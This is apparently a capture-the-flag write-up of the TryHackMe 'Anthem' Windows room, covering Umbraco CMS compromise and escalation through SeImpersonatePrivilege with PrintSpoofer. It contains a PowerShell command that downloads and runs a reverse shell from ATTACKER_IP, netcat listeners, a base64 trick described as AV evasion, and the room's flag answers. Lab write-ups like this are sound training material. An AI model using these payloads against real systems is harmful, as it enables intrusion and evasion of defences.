# [THM] Anthem — Writeup
---

https://tryhackme.com/room/anthem

**Difficulty:** Easy
**Tags:** Windows, RDP, Umbraco, CMS, PrivEsc, SeImpersonatePrivilege
**Solved:** May 2026

---

## Overview

Anthem is a Windows-based room that walks you through a full attack chain: reconnaissance, CMS enumeration, flag hunting through web page source code, gaining an initial foothold via a known Umbraco CMS exploit, and finally escalating privileges using a misconfigured token — `SeImpersonatePrivilege` — combined with PrintSpoofer.

It's a great beginner room for understanding how Windows environments can be compromised through public-facing web applications.

---

## Reconnaissance

Standard nmap scan against the target:

```bash
sudo nmap -p- ip -sV --min-rate 1000 -T4 -oA scan -Pn
```

Two ports come back open:

| Port | Service |
|------|---------|
| 80 | HTTP (web server) |
| 3389 | RDP (Remote Desktop Protocol) |

---

## Website Analysis

### robots.txt

Navigating to `/robots.txt` immediately gives us two things:

- The CMS in use: **Umbraco**
- A potential password: `UmbracoIsTheBest!`

This is a classic misconfiguration — credentials or sensitive hints left in a file intended for search engine crawlers.

### Domain

The domain of the website is `anthem.com`, visible in the page headers and metadata.

### Finding the Administrator's Name

Browsing to `/archive/a-cheers-to-our-it-department/` reveals a post containing the full Solomon Grundy nursery rhyme:

> Born on a Monday, Christened on Tuesday, Married on Wednesday...

The name **Solomon Grundy** is the answer. This is a good example of OSINT through content — the admin's identity was embedded in a public blog post.

### Administrator Email

Visiting `/archive/we-are-hiring/` shows a staff email in the format `JD@anthem.com`. Applying the same pattern to the administrator:

**Solomon Grundy → SG@anthem.com**

---

## Spot the Flags

All four flags are hidden in the HTML source of various pages on the site. Standard procedure: open DevTools or `Ctrl+U` on each page and search for `THM{`.

| Flag | Value |
|------|-------|
| Flag 1 | `THM{L0L_WH0_US3S_M3T4}` |
| Flag 2 | `THM{G!T_G00D}` |
| Flag 3 | `THM{L0L_WH0_D15}` |
| Flag 4 | `THM{AN0TH3R_M3TA}` |

---

## Initial Foothold — Umbraco RCE

Umbraco CMS has a known authenticated RCE vulnerability. Using the credentials found during enumeration (`SG@anthem.com` / `UmbracoIsTheBest!`), we log into the Umbraco admin panel.

From there, the existing PoC was modified to achieve Remote Code Execution. The payload downloads and executes a PowerShell reverse shell hosted on the attacker machine.

First, generate the shell on [revshells.com](https://revshells.com) and save it as `shell.ps1`. Host it with a Python HTTP server:

```bash
python3 -m http.server 5555
```

The RCE payload:

```powershell
"/c powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:5555/shell.ps1')\""
```

Set up a listener:

```bash
nc -lvnp 5555
```

We now have a shell on the box.

---

## Privilege Escalation — SeImpersonatePrivilege + PrintSpoofer

Checking our current privileges:

```cmd
whoami /priv
```

`SeImpersonatePrivilege` is enabled. This is a well-known escalation path on Windows — it allows a process to impersonate the security context of another user, which can be abused to impersonate `NT AUTHORITY\SYSTEM`.

The tool of choice here is **PrintSpoofer**.

### Bypassing AV — Base64 Transfer

Directly downloading an `.exe` will likely be caught by AV. Instead, we encode the binary on Kali and transfer it as a text file:

**Kali:**
```bash
base64 -w 0 PrintSpoofer.exe > spoofer.txt
python3 -m http.server 9000
```

**Windows shell:**
```powershell
$b64 = (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:9000/spoofer.txt')
[System.IO.File]::WriteAllBytes("C:\Windows\Temp\ps.exe", [Convert]::FromBase64String($b64))
```

This reconstructs the binary on disk at `C:\Windows\Temp\ps.exe` without triggering signature-based detection.

### Getting a SYSTEM Shell

Simply running `.\ps.exe -i -c powershell` won't work in this context because the resulting shell isn't interactive. The workaround is to have PrintSpoofer launch our reverse shell script directly.

Download a second copy of `shell.ps1` with a different port (4444) and save it locally:
*If the AV blocks it, encode the shell.ps1 and repeat the previous step, just like we did with the PrintSpoofer.*

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:9000/shell.ps1', 'C:\Windows\Temp\shell.ps1')
```

Set up a new listener on Kali:

```bash
nc -lvnp 4444
```

Then execute PrintSpoofer, pointing it at the local script:

```powershell
.\ps.exe -i -c "powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\Windows\Temp\shell.ps1"
```

The listener catches a shell as `NT AUTHORITY\SYSTEM`.

---

## Key Takeaways

- `robots.txt` is always worth checking — it's meant for crawlers, not secrets, but people put secrets in it anyway
- Blog post content can leak identity information that maps directly to credentials
- `SeImpersonatePrivilege` is one of the most reliable Windows escalation paths — if you see it enabled on a service account, you're likely going to SYSTEM
- AV evasion doesn't always require sophisticated tooling — base64 encoding over HTTP is often enough on default configurations
- When an interactive shell fails, route execution through a file rather than a command string

---

*Tags: Windows · TryHackMe · CMS · Umbraco · Privilege Escalation · RDP · CTF*